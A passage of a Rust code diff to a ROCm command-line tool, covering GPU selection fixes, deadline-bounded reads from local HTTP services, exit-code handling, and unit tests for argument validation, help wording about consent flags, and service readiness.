+        // No visible device (amd-smi unavailable, genuinely zero devices, or every
+        // detected device masked out). Do not assume device 0 exists: return no
+        // selection and let the engine's device probe pin the first present GPU or
+        // fail fast under the GPU-required policy (no GPU-0 fallback).
         return Vec::new();
     }
-    let candidates = || (0..count as u32).filter(|index| !busy.contains(index));
+    let candidates = || all.iter().copied().filter(|index| !busy.contains(index));
     let usage_for = |index: u32| vram.and_then(|rows| rows.iter().find(|row| row.index == index));
 
     if vram.is_some() {
@@ -16563,10 +20910,12 @@ fn select_auto_gpu_index(
     if let Some(index) = candidates().next() {
         return vec![index];
     }
-    // Every detected GPU is pinned by a running service. We still return GPU 0
-    // (no CPU fallback is ever used); the caller surfaces a low-memory warning
-    // so the user can free a device or pick another `--gpu`.
-    vec![0]
+    // Every visible GPU is pinned by a running service. Return the lowest visible
+    // ordinal (no CPU fallback is ever used); the caller surfaces a low-memory
+    // warning so the user can free a device or pick another `--gpu`. Using the
+    // lowest *visible* ordinal rather than a hardcoded 0 keeps this correct when
+    // device 0 is masked out.
+    vec![all[0]]
 }
 
 /// Best-effort per-GPU VRAM occupancy via `amd-smi metric --json`. Returns
@@ -17075,6 +21424,7 @@ fn http_get_local_service(
     endpoint_api_key: Option<&str>,
     timeout: Duration,
 ) -> Result<(u16, String)> {
+    let deadline = std::time::Instant::now() + timeout;
     let mut stream = connect_tcp_stream(host, port, timeout)?;
     let host_header = format_host_port(host, port);
     // Authenticate the probe when the endpoint is protected; loopback endpoints
@@ -17088,7 +21438,7 @@ fn http_get_local_service(
     );
     write_all_tcp_stream(&mut stream, request.as_bytes())
         .context("failed to write service readiness request")?;
-    let response = read_tcp_stream_to_string(&mut stream)
+    let response = read_http_response_bounded(&mut stream, deadline)
         .context("failed to read service readiness response")?;
     let (headers, body) = response
         .split_once("\r\n\r\n")
@@ -17109,6 +21459,7 @@ fn http_post_local_service_json(
     body: &serde_json::Value,
     timeout: Duration,
 ) -> Result<(u16, String)> {
+    let deadline = std::time::Instant::now() + timeout;
     let mut stream = connect_tcp_stream(host, port, timeout)?;
     let host_header = format_host_port(host, port);
     let body = serde_json::to_string(body).context("failed to serialize service request")?;
@@ -17119,8 +21470,8 @@ fn http_post_local_service_json(
     );
     write_all_tcp_stream(&mut stream, request.as_bytes())
         .context("failed to write service request")?;
-    let response =
-        read_tcp_stream_to_string(&mut stream).context("failed to read service response")?;
+    let response = read_http_response_bounded(&mut stream, deadline)
+        .context("failed to read service response")?;
     let (headers, body) = response
         .split_once("\r\n\r\n")
         .unwrap_or((response.as_str(), ""));
@@ -17278,6 +21629,107 @@ fn treat_as_natural_language(args: &[String]) -> bool {
 
 #[cfg(test)]
 mod tests {
+    use std::process::ExitCode;
+
+    /// `Ok(())` must map to a clean exit so `rocm`'s successful commands don't
+    /// regress to a nonzero code.
+    #[test]
+    fn exit_code_for_ok_is_success() {
+        assert_eq!(super::exit_code_for(Ok(())), ExitCode::SUCCESS);
+    }
+
+    /// `fix()`'s marker error must carry its exact code through, since that
+    /// code (2/3/4/5) is part of `rocm fix`'s documented contract.
+    #[test]
+    fn exit_code_for_fix_exit_code_carries_the_code() {
+        let err = anyhow::Error::new(super::FixExitCode(3));
+        assert_eq!(super::exit_code_for(Err(err)), ExitCode::from(3));
+    }
+
+    /// `ClapExitCode` exists so a usage/parse error can reach `main()` through
+    /// the ordinary return path (letting `_log_guard` drop) instead of
+    /// `clap::Error::exit()` calling `std::process::exit` mid-stack. Guard the
+    /// downcast the same way `exit_code_for_fix_exit_code_carries_the_code`
+    /// guards `FixExitCode`'s.
+    #[test]
+    fn exit_code_for_clap_exit_code_carries_the_code() {
+        let err = anyhow::Error::new(super::ClapExitCode(2));
+        assert_eq!(super::exit_code_for(Err(err)), ExitCode::from(2));
+    }
+
+    /// `run()`'s mistyped-subcommand branch and `parse_cli()` both route a
+    /// real `clap::Error` through the production `clap_exit_code` helper
+    /// (not a hand-built `ClapExitCode`), so this calls that same helper on a
+    /// real parse failure to exercise the actual
+    /// `clap parse failure -> clap_exit_code -> ClapExitCode -> exit_code_for`
+    /// chain end to end. Reverting `clap_exit_code` to call `err.exit()`
+    /// directly, or dropping its use from either call site, breaks this.
+    #[test]
+    fn clap_error_exit_code_survives_the_clap_exit_code_round_trip() {
+        let err = command_invocation_error(&["instal".to_owned()])
+            .expect("`instal` should read as a mistyped subcommand");
+        let expected_code = err.exit_code();
+        let result: Result<()> = Err(super::clap_exit_code(err));
+        assert_eq!(
+            super::exit_code_for(result),
+            ExitCode::from(expected_code as u8)
+        );
+    }
+
+    /// `parse_cli()` itself reads `std::env::args_os()` (via
+    /// `Command::try_get_matches()`), which a unit test cannot redirect, so
+    /// this exercises the same `cli_command()` builder with an explicit argv
+    /// instead: an unrecognised flag is the common case `parse_cli()` was
+    /// still routing through `err.exit()` before it switched from
+    /// `get_matches()` to `try_get_matches()`.
+    #[test]
+    fn cli_command_rejects_unknown_flag_through_clap_exit_code() {
+        let err = super::cli_command()
+            .try_get_matches_from(["rocm", "--this-flag-does-not-exist"])
+            .expect_err("an unknown flag must be a parse error");
+        let expected_code = err.exit_code();
+        let result: Result<()> = Err(super::clap_exit_code(err));
+        assert_eq!(
+            super::exit_code_for(result),
+            ExitCode::from(expected_code as u8)
+        );
+    }
+
+    /// Any other error must still fail with exit 1, matching what
+    /// `Result<(), anyhow::Error>`'s `Termination` impl already does today for
+    /// every subcommand other than `fix`.
+    #[test]
+    fn exit_code_for_generic_error_is_failure() {
+        let err = anyhow::anyhow!("boom");
+        assert_eq!(super::exit_code_for(Err(err)), ExitCode::FAILURE);
+    }
+
+    /// Exercises the real `dispatch -> fix -> FixExitCode -> exit_code_for`
+    /// chain end to end, not just `exit_code_for` in isolation. Guards against
+    /// a future change at the `Command::Fix` dispatch arm (e.g. discarding the
+    /// error into a fresh `anyhow!(...)`) silently breaking the downcast and
+    /// falling through to the generic exit 1.
+    #[test]
+    fn dispatch_carries_fixs_exit_code_through_to_exit_code_for() {
+        // Skip the startup update check: it's a side effect unrelated to what
+        // this test verifies, and could otherwise touch the network. Goes
+        // through `ScopedTestEnv` so it's serialized against every other test
+        // that touches process env and restored on drop even on panic.
+        let mut env = ScopedTestEnv::new();
+        env.set("ROCM_CLI_DISABLE_STARTUP_UPDATE_CHECK", "1");
+        let cli = super::Cli {
+            command: Some(super::Command::Fix {
+                fix_id: Some("fix-does-not-exist".to_owned()),
+                yes: true,
+                dry_run: false,
+                device_index: None,
+            }),
+        };
+        let result = super::dispatch(cli);
+        drop(env);
+        assert_eq!(super::exit_code_for(result), ExitCode::from(2));
+    }
+
     /// A cache that has moved inside a directory uninstall already removes must
     /// not be reported as "not removed" — the note would be false.
     #[test]
@@ -17338,6 +21790,80 @@ mod tests {
 
     use super::*;
     use serde_json::json;
+
+    /// Serializes and isolates tests that read or mutate process-global env vars.
+    ///
+    /// `std::env::set_var`/`remove_var` are `unsafe` in edition 2024 because
+    /// concurrent env mutation races with any concurrent `env::var` read anywhere
+    /// in the process, and `cargo test` runs these functions multi-threaded in one
+    /// binary. A unique variable name does not make a mutation safe — the hazard is
+    /// the mutation racing a read, not a name collision. Every test that touches
+    /// env therefore holds this one process-wide lock, and each mutation is saved
+    /// and restored on drop so it cannot leak into another test.
+    struct ScopedTestEnv {
+        _lock: std::sync::MutexGuard<'static, ()>,
+        saved: Vec<(String, Option<String>)>,
+    }
+
+    impl ScopedTestEnv {
+        fn new() -> Self {
+            static LOCK: Mutex<()> = Mutex::new(());
+            let lock = LOCK
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner);
+            Self {
+                _lock: lock,
+                saved: Vec::new(),
+            }
+        }
+
+        /// Clear the two AMD driver-install override vars for the duration of the
+        /// test, so a value exported in the developer's or runner's shell cannot
+        /// leak into a plan and make its resolved `repo_version`/package release
+        /// disagree with the assertion.
+        fn with_amd_overrides_cleared() -> Self {
+            let mut env = Self::new();
+            env.clear("ROCM_CLI_AMDGPU_VERSION");
+            env.clear("ROCM_CLI_AMDGPU_PACKAGE_RELEASE");
+            env
+        }
+
+        fn save(&mut self, key: &str) {
+            if !self.saved.iter().any(|(saved_key, _)| saved_key == key) {
+                self.saved.push((key.to_owned(), std::env::var(key).ok()));
+            }
+        }
+
+        #[allow(unsafe_code)] // std::env::set_var is unsafe in edition 2024
+        fn set(&mut self, key: &str, value: &str) {
+            self.save(key);
+            unsafe {
+                std::env::set_var(key, value);
+            }
+        }
+
+        #[allow(unsafe_code)] // std::env::remove_var is unsafe in edition 2024
+        fn clear(&mut self, key: &str) {
+            self.save(key);
+            unsafe {
+                std::env::remove_var(key);
+            }
+        }
+    }
+
+    impl Drop for ScopedTestEnv {
+        #[allow(unsafe_code)] // std::env::set_var/remove_var are unsafe in edition 2024
+        fn drop(&mut self) {
+            for (key, previous) in self.saved.iter().rev() {
+                unsafe {
+                    match previous {
+                        Some(value) => std::env::set_var(key, value),
+                        None => std::env::remove_var(key),
+                    }
+                }
+            }
+        }
+    }
 
     // The previous `daemon_run_argv_targets_rocmd_run_with_automations` unit test
     // only re-asserted the literals `daemon_run_argv()` returns, so it tested
@@ -17439,6 +21965,153 @@ mod tests {
                 "`{choice}` must be offered by `rocm examine --help`:\n{help}"
             );
         }
+    }
+
+    #[test]
+    fn install_sdk_help_describes_the_gate_as_replacing_the_active_default() {
+        // `rocm install sdk --help` is the most-read description of the `--yes`
+        // gate, and it is the one surface a "reword every site" pass can miss —
+        // this branch's own history has it being missed once and corrected in a
+        // follow-up. So the assertions read the `yes` argument's own help text
+        // rather than the whole rendered page: the sibling
+        // `--approve-replacing-active-default` doc independently satisfies a
+        // page-wide "active default" match, which would keep a reverted `--yes`
+        // doc green.
+        //
+        // The effect is a displacement, not a deletion: in the default managed
+        // install root `runtime_key` embeds the resolved version, so an upgrade
+        // or downgrade lands in its own install root and the previous install
+        // stays on disk — only the active default moves. Claiming an overwrite
+        // here would promise a deletion that does not happen and contradict the
+        // prompt and the README.
+        let mut command = Cli::command();
+        let sdk = command
+            .find_subcommand_mut("install")
+            .expect("install subcommand")
+            .find_subcommand_mut("sdk")
+            .expect("install sdk subcommand");
+        let yes = sdk
+            .get_arguments()
+            .find(|arg| arg.get_id() == "yes")
+            .expect("`install sdk` must offer --yes");
+        let yes_help = yes
+            .get_long_help()
+            .or_else(|| yes.get_help())
+            .expect("--yes must be documented")
+            .to_string();
+
+        assert!(
+            yes_help.contains("active default"),
+            "`--yes` must document itself as approving a replacement of the \
+             active default:\n{yes_help}"
+        );
+        assert!(
+            !yes_help.to_lowercase().contains("overwrit"),
+            "`--yes` must not claim an overwrite; an upgrade or downgrade leaves \
+             the previous install on disk:\n{yes_help}"
+        );
+    }
+
+    #[test]
+    fn install_sdk_help_separates_the_two_consents_yes_carries() {
+        // `--yes` approves two unrelated things: replacing the active default
+        // runtime, and running `sudo` for required system packages. The whole
+        // point of the narrow flag is that a caller with no terminal can grant
+        // the first without the second, so the help has to say so — a reader who
+        // believes it is a synonym for `--yes` will reach for `--yes` from a
+        // script and get a sudo prompt nothing can answer.
+        let help = Cli::command()
+            .find_subcommand_mut("install")
+            .expect("install subcommand")
+            .find_subcommand_mut("sdk")
+            .expect("install sdk subcommand")
+            .render_long_help()
+            .to_string();
+        assert!(
+            help.contains("--approve-replacing-active-default"),
+            "`rocm install sdk --help` must document the narrow consent flag:\n{help}"
+        );
+        assert!(
+            help.contains("does not approve system-package installs"),
+            "`rocm install sdk --help` must say the narrow flag excludes \
+             system-package installs:\n{help}"
+        );
+    }
+
+    #[test]
+    fn update_apply_approval_never_credits_the_inert_yes_flag() {
+        // Pins `SdkInstallApprovalSource::UpdateApply`: the update path is
+        // preapproved, but it must never print a line crediting `--yes`.
+        //
+        // `rocm update` now *does* take a `--yes` flag, added for consistency
+        // with the other mutating commands, and the deliberate decision the
+        // flag's arrival called for has been made: the behaviour does not
+        // change. That flag is inert by its own doc comment — applying never
+        // prompts — and the dispatch above discards it (`yes: _`), so it grants
+        // nothing. Crediting it would claim an approval the user never gave,
+        // and on `rocm install sdk` `--yes` additionally approves running
+        // `sudo`, so the claim would be doubly wrong.
+        //
+        // This replaces an assertion that `rocm update --help` contained no
+        // `--yes` at all: a proxy for the invariant that only held while the
+        // flag was absent. Pin the invariant itself so this still fails if the
+        // update path is ever made to credit the flag.
+        for activates in [true, false] {
+            let line = therock::preapproved_install_line(
+                therock::SdkInstallApprovalSource::UpdateApply { activates },
+                "upgrade from installed 7.13.0 (release-wheel-gfx120X-all)",
+                "7.14.0",
+            );
+            assert!(
+                !line.contains("--yes"),
+                "`rocm update --apply` (activates={activates}) credited --yes, \
+                 but that flag grants it nothing: {line}"
+            );
+            assert!(
+                line.starts_with("Requested by `rocm update --apply"),
+                "the update path must name itself as the approval source: {line}"
+            );
+        }
+    }
+
+    #[test]
+    fn runtimes_help_uses_the_runtime_noun_throughout() {
+        // `comfyui install`'s selection errors steer the user to `rocm runtimes`
+        // and say "ROCm runtime". The help for the command they land on must use
+        // the same noun — including its own about line, which `rocm runtimes
+        // --help` prints above the subcommand list and which the rename missed
+        // while every subcommand below it already said "runtime".
+        let help = Cli::command()
+            .find_subcommand_mut("runtimes")
+            .expect("runtimes subcommand")
+            .render_long_help()
+            .to_string();
+        assert!(
+            help.contains("ROCm runtimes"),
+            "`rocm runtimes --help` should describe itself with the `runtime` noun:\n{help}"
+        );
+        assert!(
+            !help.contains("ROCm install"),
+            "`rocm runtimes --help` must not reintroduce the `ROCm install` noun:\n{help}"
+        );
+
+        // The help is not the only `runtimes` string a user reads: running a
+        // mutating `rocm runtimes …` from chat raises an approval modal whose
+        // title is written here, not by clap, so the help assertions above
+        // cannot reach it. It said "Change ROCm install" until this rename.
+        let action = chat_rocm_command_action_from_args(vec![
+            "runtimes".to_owned(),
+            "activate".to_owned(),
+            "some-runtime-key".to_owned(),
+        ])
+        .expect("a mutating runtimes command classifies");
+        let ChatRocmCommandAction::Approval { pending_title, .. } = action else {
+            panic!("`rocm runtimes activate` must require approval, got {action:?}");
+        };
+        assert!(
+            pending_title.contains("runtime") && !pending_title.contains("install"),
+            "the `runtimes` approval modal must use the `runtime` noun, got {pending_title:?}"
+        );
     }
 
     #[test]
@@ -17718,23 +22391,7 @@ mod tests {
         }
     }
 
-    fn possible_values_listed_in_help(help: &str) -> Vec<String> {
-        let marker = "[possible values:";
-        let start = help
-            .find(marker)
-            .unwrap_or_else(|| panic!("help text missing `{marker}`: {help:?}"));
-        let rest = &help[start + marker.len()..];
-        let end = rest
-            .find(']')
-            .unwrap_or_else(|| panic!("unterminated possible-values list in help: {help:?}"));
-        rest[..end]
-            .split(',')
-            .map(|value| value.trim().to_owned())
-            .filter(|value| !value.is_empty())
-            .collect()
-    }
-
-    fn serve_arg_help(arg_id: &str) -> String {
+    fn serve_possible_values(arg_id: &str) -> Vec<String> {
         let cli = Cli::command();
         let serve = cli
             .find_subcommand("serve")
@@ -17743,32 +22400,25 @@ mod tests {
             .get_arguments()
             .find(|arg| arg.get_id().as_str() == arg_id)
             .unwrap_or_else(|| panic!("serve has no `{arg_id}` argument"))
-            .get_help()
-            .map(ToString::to_string)
-            .unwrap_or_default()
-    }
-
-    // `--engine` restricts its input to `SUPPORTED_ENGINES` via a clap
-    // `value_parser`, so the possible values are advertised in `--help` and shell
-    // completion structurally (not a hand-written doc string). `--device` stays
-    // free-form (it accepts aliases such as `auto`/`gpu` plus the intentional
-    // `cpu_only` rejection), so its advertised list is hand-written and guarded
-    // by a sync test below. Both guards keep the advertised lists honest.
-    #[test]
-    fn serve_engine_help_lists_match_engine_inventory() {
-        let cli = Cli::command();
-        let serve = cli
-            .find_subcommand("serve")
-            .expect("serve subcommand exists");
-        let engine_arg = serve
-            .get_arguments()
-            .find(|arg| arg.get_id() == "engine")
-            .expect("serve has an `engine` argument");
-        let mut listed: Vec<String> = engine_arg
             .get_possible_values()
             .iter()
             .map(|value| value.get_name().to_owned())
-            .collect();
+            .collect()
+    }
+
+    // Both `--engine` and `--device` restrict their input to a fixed set via a
+    // clap `value_parser`/`ValueEnum`, so invalid input is rejected as a usage
+    // error (exit code 2) with the accepted choices listed. Values are advertised
+    // in `--help` and shell completion structurally (not a hand-written doc
+    // string), with one deliberate exception: `--device cpu_only` is
+    // `#[value(hide = true)]` — still accepted so its exit-1 rejection message
+    // survives, but kept out of help and completion. The sync tests below keep the
+    // advertised lists honest; `serve_device_help_lists_match_device_policy_names`
+    // compares against the full `DevicePolicy` set (hidden entries included, via
+    // `get_possible_values`), so a dropped or renamed variant still fails.
+    #[test]
+    fn serve_engine_help_lists_match_engine_inventory() {
+        let mut listed = serve_possible_values("engine");
         let mut expected: Vec<String> = builtin_engine_inventory()
             .iter()
             .map(|(name, _)| (*name).to_owned())
@@ -17783,7 +22433,7 @@ mod tests {
 
     #[test]
     fn serve_device_help_lists_match_device_policy_names() {
-        let mut listed = possible_values_listed_in_help(&serve_arg_help("device"));
+        let mut listed = serve_possible_values("device");
         let mut expected: Vec<String> = [
             DevicePolicy::GpuRequired,
             DevicePolicy::GpuPreferred,
@@ -17796,7 +22446,63 @@ mod tests {
         expected.sort();
         assert_eq!(
             listed, expected,
-            "serve --device help possible-values must stay in sync with DevicePolicy names"
+            "serve --device possible-values must stay in sync with DevicePolicy names"
+        );
+    }
+
+    #[test]
+    fn serve_rejects_unknown_device_policy_as_usage_error() {
+        // An invalid `--device` must fail clap's value validation (a usage error,
+        // exit code 2) rather than parsing as a free-form string and failing later
+        // in application logic (exit code 1). This keeps `--device` consistent with
+        // every other enum-style argument and lists the valid choices in the error.
+        let error = parse_serve(&["--device", "bogus"]).expect_err("invalid device rejected");
+        assert_eq!(error.kind(), clap::error::ErrorKind::InvalidValue);
+    }
+
+    #[test]
+    fn serve_accepts_device_policy_values_and_aliases() {
+        for (value, expected) in [
+            ("gpu_required", DevicePolicyArg::GpuRequired),
+            ("gpu_preferred", DevicePolicyArg::GpuPreferred),
+            ("cpu_only", DevicePolicyArg::CpuOnly),
+            // Historical aliases stay accepted for backward compatibility.
+            ("auto", DevicePolicyArg::GpuRequired),
+            ("gpu", DevicePolicyArg::GpuRequired),
+            ("cpu", DevicePolicyArg::CpuOnly),
+        ] {
+            let cli = parse_serve(&["--device", value]).expect("device value parses");
+            match cli.command {
+                Some(Command::Serve { device, .. }) => {
+                    assert_eq!(device, Some(expected), "device value `{value}`");
+                }
+                other => panic!("expected Serve, got {other:?}"),
+            }
+        }
+    }
+
+    #[test]
+    fn device_policy_arg_maps_through_parse_device_policy() {
+        // `as_policy_str` feeds the parsed variant back through
+        // `parse_device_policy`, the single choke point enforcing the strict
+        // no-CPU policy. Guard the mapping so a mis-typed arm (e.g. `CpuOnly =>
+        // "gpu_required"`) cannot silently turn the deliberate CPU rejection into
+        // a GPU-required serve while every other test stays green.
+        assert_eq!(
+            parse_device_policy(Some(DevicePolicyArg::GpuRequired.as_policy_str()))
+                .expect("gpu_required parses"),
+            DevicePolicy::GpuRequired
+        );
+        assert_eq!(
+            parse_device_policy(Some(DevicePolicyArg::GpuPreferred.as_policy_str()))
+                .expect("gpu_preferred parses"),
+            DevicePolicy::GpuRequired
+        );
+        // `cpu_only` must still be rejected outright rather than mapped to a
+        // GPU policy.
+        assert!(
+            parse_device_policy(Some(DevicePolicyArg::CpuOnly.as_policy_str())).is_err(),
+            "cpu_only must be rejected"
         );
     }
 
@@ -17866,6 +22572,151 @@ mod tests {
             }
             other => panic!("expected Serve, got {other:?}"),
         }
+    }
+
+    #[test]
+    fn serve_parses_generation_flags() {
+        let cli = parse_serve(&[
+            "--temperature",
+            "0.5",
+            "--top-p",
+            "0.25",
+            "--max-tokens",
+            "128",
+        ])
+        .expect("generation flags parse");
+        match cli.command {
+            Some(Command::Serve {
+                temperature,
+                top_p,
+                max_tokens,
+                ..
+            }) => {
+                assert_eq!(temperature, Some(0.5));
+                assert_eq!(top_p, Some(0.25));
+                assert_eq!(max_tokens, Some(128));
+            }
+            other => panic!("expected Serve, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn serve_rejects_out_of_range_sampling() {
+        // top-p is a probability; temperature must be non-negative. Both are
+        // validated at the CLI boundary so a bad value never reaches the engine.
+        assert_eq!(
+            parse_serve(&["--top-p=1.5"])
+                .expect_err("top-p above 1.0 is rejected")
+                .kind(),
+            clap::error::ErrorKind::ValueValidation
+        );
+        assert_eq!(
+            parse_serve(&["--temperature=-0.1"])
+                .expect_err("negative temperature is rejected")
+                .kind(),
+            clap::error::ErrorKind::ValueValidation
+        );
+        assert_eq!(
+            parse_serve(&["--max-tokens=0"])
+                .expect_err("zero max-tokens is rejected")
+                .kind(),
+            clap::error::ErrorKind::ValueValidation
+        );
+    }
+
+    #[test]
+    fn serve_negative_sampling_space_form_reaches_range_validator() {
+        // The space form (`--temperature -1`) must reach the value parser and
+        // report a value error, not be rejected by clap as an unexpected argument.
+        // This is the classic negative-number-as-flag gotcha; `allow_negative_numbers`
+        // makes both forms validate identically. `--max-tokens` shares the gotcha even
+        // though it is a positive integer: the ambiguity is at the tokenizer, before the
+        // value parser runs, so the space form must reach `parse_positive_u32` too.
+        for args in [
+            &["--temperature", "-1"][..],
+            &["--temperature=-1"][..],
+            &["--top-p", "-0.5"][..],
+            &["--top-p=-0.5"][..],
+            &["--max-tokens", "-1"][..],
+            &["--max-tokens=-1"][..],
+        ] {
+            assert_eq!(
+                parse_serve(args)
+                    .expect_err("negative sampling value is rejected")
+                    .kind(),
+                clap::error::ErrorKind::ValueValidation,
+                "expected range validation for {args:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn chat_negative_sampling_space_form_reaches_range_validator() {
+        // Mirrors `serve_negative_sampling_space_form_reaches_range_validator`: the
+        // same numeric value flags carry `allow_negative_numbers` on `chat`, so the
+        // space form reaches the value parser instead of clap's unexpected-argument path.
+        for args in [
+            &["--temperature", "-1"][..],
+            &["--temperature=-1"][..],
+            &["--top-p", "-0.5"][..],
+            &["--top-p=-0.5"][..],
+            &["--max-tokens", "-1"][..],
+            &["--max-tokens=-1"][..],
+        ] {
+            let mut argv = vec!["rocm", "chat", "--prompt", "hi"];
+            argv.extend_from_slice(args);
+            assert_eq!(
+                Cli::try_parse_from(argv)
+                    .expect_err("negative sampling value is rejected")
+                    .kind(),
+                clap::error::ErrorKind::ValueValidation,
+                "expected range validation for {args:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn chat_parses_generation_flags() {
+        let cli = Cli::try_parse_from([
+            "rocm",
+            "chat",
+            "--prompt",
+            "hello",
+            "--temperature",
+            "0.5",
+            "--top-p",
+            "0.25",
+            "--max-tokens",
+            "64",
+        ])
+        .expect("chat generation flags parse");
+        match cli.command {
+            Some(Command::Chat {
+                temperature,
+                top_p,
+                max_tokens,
+                ..
+            }) => {
+                assert_eq!(temperature, Some(0.5));
+                assert_eq!(top_p, Some(0.25));
+                assert_eq!(max_tokens, Some(64));
+            }
+            other => panic!("expected Chat, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn chat_rejects_zero_max_tokens() {
+        let error = Cli::try_parse_from(["rocm", "chat", "--prompt", "hello", "--max-tokens", "0"])
+            .expect_err("zero max-tokens is rejected");
+        assert_eq!(error.kind(), clap::error::ErrorKind::ValueValidation);
+    }
+
+    #[test]
+    fn update_rejects_zero_timeout_secs() {
+        let error = Cli::try_parse_from(["rocm", "update", "--json", "--timeout-secs", "0"])
+            .expect_err("zero timeout-secs is rejected");
+        assert_eq!(error.kind(), clap::error::ErrorKind::ValueValidation);
     }
 
     #[test]
@@ -18184,6 +23035,70 @@ mod tests {
     }
 
     #[test]
+    fn lemonade_stop_unload_is_bounded_by_the_request_timeout() -> Result<()> {
+        use std::io::{Read, Write};
+        use std::net::TcpListener;
+        use std::time::Instant;
+
+        // Regression test for the stall this PR fixes: a peer that trickles the
+        // response one byte at a time, never framing or closing, used to stall
+        // `read_tcp_stream_to_string`'s read-to-EOF loop indefinitely. That hung
+        // `unload_lemonade_service_model` past its 5s timeout during scenario
+        // teardown, showing up as an unexplained multi-minute gap. The unload
+        // call must now return an error at (not far past) its 5s budget.
+        let listener = TcpListener::bind(("127.0.0.1", 0))?;
+        let port = listener.local_addr()?.port();
+        thread::spawn(move || {
+            let Ok((mut stream, _)) = listener.accept() else {
+                return;
+            };
+            stream.set_read_timeout(Some(Duration::from_secs(2))).ok();
+            let mut buffer = [0_u8; 512];
+            let _ = stream.read(&mut buffer);
+            let body = b"{\"status\":\"success\",\"message\":\"ok\"}";
+            let header = format!(
+                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n",
+                body.len()
+            );
+            let _ = stream.write_all(header.as_bytes());
+            // One byte every 300ms never finishes framing the 35-byte body
+            // inside the 5s unload timeout below, so the bound under test is
+            // the deadline firing, not the response completing early.
+            for byte in body {
+                if stream.write_all(&[*byte]).is_err() {
+                    return;
+                }
+                thread::sleep(Duration::from_millis(300));
+            }
+        });
+
+        let (_root, paths) = test_paths("lemonade-stop-unload-dribble");
+        let record = ManagedServiceRecord::new(
+            &paths,
+            "svc-qwen",
+            "lemonade",
+            "qwen",
+            "Qwen3-0.6B-GGUF",
+            "127.0.0.1",
+            port,
+            "managed",
+            123,
+            Some("therock-release".to_owned()),
+            Some("lemonade-embeddable-10.6.0".to_owned()),
+            Some("gpu_required".to_owned()),
+        );
+        let started = Instant::now();
+        assert!(unload_lemonade_service_model(&record).is_err());
+        let elapsed = started.elapsed();
+        assert!(
+            elapsed >= Duration::from_secs(4),
+            "bounded BY the 5s deadline, not failing early: {elapsed:?}"
+        );
+        assert!(elapsed < Duration::from_secs(8), "{elapsed:?}");
+        Ok(())
+    }
+
+    #[test]
     fn serve_readiness_wait_withholds_ready_while_the_model_only_lists() -> Result<()> {
         use std::io::{Read, Write};
         use std::net::TcpListener;
@@ -18283,6 +23198,71 @@ mod tests {
 
         assert_eq!(readiness, EndpointReadiness::Serving);
         assert_eq!(status_for_readiness(readiness), "ready");
+        drop(server);
+        Ok(())
+    }
+
+    #[test]
+    fn serve_readiness_ready_verdict_does_not_wait_for_the_peer_to_close() -> Result<()> {
+        use std::io::{Read, Write};
+        use std::net::TcpListener;
+        use std::time::Instant;
+
+        // Regression test for the other half of this PR's fix: a response is
+        // read to completion by its own framing, not by waiting for the peer
+        // to close. Before this fix, `read_tcp_stream_to_string` blocked
+        // until EOF, so a keep-alive engine that answers correctly but never
+        // closes the socket looked identical to a hung one — the readiness
+        // probe ran out its timeout and reported not-ready even though the
+        // answer had already arrived.
+        let listener = TcpListener::bind(("127.0.0.1", 0))?;
+        let port = listener.local_addr()?.port();
+        let server = thread::spawn(move || {
+            while let Ok((mut stream, _)) = listener.accept() {
+                thread::spawn(move || {
+                    stream.set_read_timeout(Some(Duration::from_secs(2))).ok();
+                    let mut buffer = [0_u8; 1024];
+                    let Ok(read) = stream.read(&mut buffer) else {
+                        return;
+                    };
+                    let request = String::from_utf8_lossy(&buffer[..read]).into_owned();
+                    let body = if request.starts_with("POST /v1/chat/completions ") {
+                        r#"{"choices":[{"message":{"content":"ok"}}]}"#
+                    } else {
+                        r#"{"data":[{"id":"Qwen3-0.6B-GGUF"}]}"#
+                    };
+                    let _ = write!(
+                        stream,
+                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{}",
+                        body.len(),
+                        body
+                    );
+                    // Hold the connection open well past the readiness wait's
+                    // timeout below, and deliberately omit `Connection:
+                    // close`. The client must not need EOF to recognize the
+                    // response as complete.
+                    thread::sleep(Duration::from_secs(10));
+                });
+            }
+        });
+
+        let started = Instant::now();
+        let readiness = wait_for_service_http_ready(
+            "vllm",
+            "127.0.0.1",
+            port,
+            "Qwen3-0.6B-GGUF",
+            None,
+            Duration::from_secs(5),
+        );
+
+        assert_eq!(readiness, EndpointReadiness::Serving);
+        assert!(
+            started.elapsed() < Duration::from_secs(3),
+            "a complete response must be recognized without waiting on the peer to close"
+        );
+        // `server`'s accept loop runs forever; dropping the JoinHandle detaches
+        // it rather than joining, and the thread dies with the test process.
         drop(server);
         Ok(())
     }
@@ -18977,17 +23957,149 @@ mod tests {
     }
 
     #[test]
+    fn freeform_execution_grants_the_narrow_consent_the_outer_yes_already_gave() {
+        // `rocm --yes <request>` dispatches the generated argv **in process**, so
+        // nothing carries the outer `--yes` into `install()` unless this does.
+        // Without it the surface prints `approval: granted by --yes` and then
+        // either refuses non-interactively, asking for a flag it offers no way to
+        // pass, or prompts on a terminal it just said it would not need to ask.
+        let request =
+            "install the latest TheRock nightly for this GPU into D:\\ROCm\\therock_venvs";
+        let config = RocmCliConfig::default();
+
+        let planned = freeform_plan_next_action(request, &config)
+            .expect("install request should have next action");
+        assert!(
+            !planned
+                .args
+                .iter()
+                .any(|arg| arg.starts_with("--yes") || arg.starts_with("--approve-")),
+            "the plan itself must stay unapproved so `rocm <request>` shows a \
+             reviewable command: {:?}",
+            planned.args
+        );
+
+        // Through the real pre-dispatch path, not the injector in isolation:
+        // `execute_freeform_next_action` is this plus the header render and
+        // `dispatch`, so dropping the injection from the pipeline fails here.
+        let execution = prepare_freeform_execution(request, &test_app_paths(), &config)
+            .expect("install request should prepare for execution");
+        let action = &execution.action;
+
+        assert_eq!(
+            format_structured_tool_call("rocm", &action.args),
+            "rocm install sdk --channel nightly --format wheel --prefix \
+             D:\\ROCm\\therock_venvs --approve-replacing-active-default"
+        );
+        // The narrow flag, never `--yes`: this surface has no terminal promise to
+        // make about a sudo password prompt for system packages.
+        assert!(!action.args.iter().any(|arg| arg == "--yes"));
+        // The header renders after injection, so the printed tool call is the
+        // argv that actually runs.
+        let rendered = render_freeform_execution_header(&execution);
+        assert!(rendered.contains("--approve-replacing-active-default"));
+        // And the operator is told why this `tool_call:` carries a consent flag
